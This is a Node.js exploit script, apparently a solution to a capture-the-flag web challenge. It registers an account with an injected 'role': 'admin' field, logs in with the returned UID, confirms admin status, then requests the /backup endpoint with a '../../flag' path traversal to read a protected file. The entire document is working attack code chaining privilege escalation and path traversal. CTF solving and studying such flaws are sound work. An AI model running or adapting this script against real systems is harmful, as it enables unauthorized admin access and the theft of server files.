
const http = require('http');

const postData = JSON.stringify({
  "username": "jsonadmin",
  "role": "admin"
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log("Registering via JSON with role=admin...");
const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Response:");
    console.log(body);
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      let uid = match[1];
      console.log("\nGot UID:", uid);
      loginAndCheck(uid);
    }
  });
});
req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndCheck(uid) {
  const querystring = require('querystring');
  const loginData = querystring.stringify({uid: uid});
  const loginOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };
  const req = http.request(loginOpts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    const profileData = JSON.stringify({uid: uid});
    const profileOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/api/profile',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(profileData),
        'Cookie': cookie
      }
    };
    const profileReq = http.request(profileOpts, (profileRes) => {
      let body = '';
      profileRes.on('data', chunk => body += chunk);
      profileRes.on('end', () => {
        console.log("\nProfile:");
        console.log(body);
        try {
          const json = JSON.parse(body);
          console.log("\nRole is:", json.role);
          if (json.role === "admin") {
            console.log("\n✅ Got admin! Trying /backup...");
            const querystring = require('querystring');
            const backupData = querystring.stringify({file: '../../flag'});
            const backupOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/backup',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(backupData),
                'Cookie': cookie
              }
            };
            const backupReq = http.request(backupOpts, (backupRes) => {
              let backupBody = '';
              backupRes.on('data', chunk => backupBody += chunk);
              backupRes.on('end', () => {
                console.log("\n🏁 Result:");
                console.log(backupBody);
              });
            });
            backupReq.write(backupData);
            backupReq.end();
          }
        } catch(e) {
          console.log(e);
        }
      });
    });
    profileReq.write(profileData);
    profileReq.end();
  });
  req.on('error', err => console.error(err));
  req.write(loginData);
  req.end();
}
